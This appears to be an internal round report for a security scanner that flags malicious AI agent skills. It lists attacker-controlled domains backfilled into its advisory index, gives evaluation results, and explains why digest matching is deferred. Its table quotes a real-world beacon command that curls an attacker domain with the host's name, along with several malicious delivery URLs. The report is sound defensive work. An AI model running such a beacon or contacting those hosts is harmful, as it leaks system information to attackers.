# GAP-ROUND-11 — Advisory indicator backfill + digest matching assessment

Date: 2026-08-04. Follows GAP-ROUND-10 (which introduced `indicators.domains`
with a single entry, `skillpay.me`).

## 1. This round's gap

ROUND-10 shipped the domain-indicator mechanism but populated it for only one
of twenty advisories. Five other advisories document attacker-controlled
infrastructure in prose that the scanner still ignored.

## 2. Backfill shipped this round (verified attacker-controlled only)

| Advisory | Domain(s) | Evidence in advisory |
| --- | --- | --- |
| SKA-2026-0001 (critical, ClawHavoc) | `app-distribution.net` | Koi Security: `install.app-distribution.net/setup/` delivery string |
| SKA-2026-0003 (critical, zaycv typosquats) | `setup-service.com` | Snyk: `download.setup-service.com/pkg/` decoy delivery string |
| SKA-2026-0006 (critical) | `setup-service.com` | "attacker-controlled `setup-service.com`" |
| SKA-2026-0016 (high, roin-orca) | `vercel-find-skills.io` | live repo: `curl -s "https://vercel-find-skills.io?&name=$(hostname)"` |
| SKA-2026-0017 (high, brand-landingpage) | `stitch-design.ai`, `google-stitch.com` | AIR trail `airsec_fakestitch`; beacon to `stitch-design.ai/api/v1` |
| SKA-2026-0019 (high, Eng0AI takeover) | `eng0ai-sdk.vercel.app` | telemetry beacon endpoint (full subdomain — `vercel.app` itself is legit) |

Deliberately **not** added: `glot.io` (legitimate paste service used as a
delivery vehicle), `api.telegram.org`, `swcdn.apple.com`,
`raw.githubusercontent.com`, `skills.sh` (legitimate infrastructure),
`moltbook.com` (SKA-2026-0009 is a design-pattern advisory, not a campaign).

Index: 64 names + **7 domains** (was 1).

## 3. Measured results

- ClawHub eval_holdout: unchanged (3368 cases, 0 errors, `malicious->clean` 2,
  clean FP 173) — these campaigns aren't in the holdout beyond what name
  matching already caught.
- Real corpora: wshobson/agents `brand-landingpage` now gets a **second,
  content-based** finding (`stitch-design.ai` → SKA-2026-0017) on top of the
  name match — a renamed clone of this skill would now still be caught. Zero
  new findings in the other three corpora.
- 118 tests green.

## 4. Advisory digest matching — assessment (decision: defer)

The schema has supported per-skill `digest` (aggregate SHA-256) since ROUND-9.
Evaluated whether to implement digest matching now:

- Only SKA-2026-0016 has content we can still fetch (live repo); every other
  documented skill was removed from its registry, so digests can't be
  captured retroactively.
- A digest match adds certainty but no recall over name+domain matching for
  the one advisory where we have content — the names and the beacon domain
  already flag it.
- Byte-identical re-uploads are the only case digests catch that indicators
  don't, and attackers trivially break byte-identity.

Decision: keep `digest` in the schema for future advisories captured live,
don't build a matcher until an advisory exists where it adds recall. Recorded
here so the loop doesn't re-litigate it.

## 5. Competitor status (no change since ROUND-10, same day)

skillgate.sh still 0.2.1; ClawScan upstream PR still an external step;
corpus-smoke still awaiting Monday's first scheduled run.

## 6. Honest conclusion

The advisory database now behaves like a real security feed: every campaign
with verifiable infrastructure is machine-matchable, offline, with severity
inherited from the advisory. The remaining detection frontier is unchanged
(semantic scams, §GAP-ROUND-10) and honestly documented.
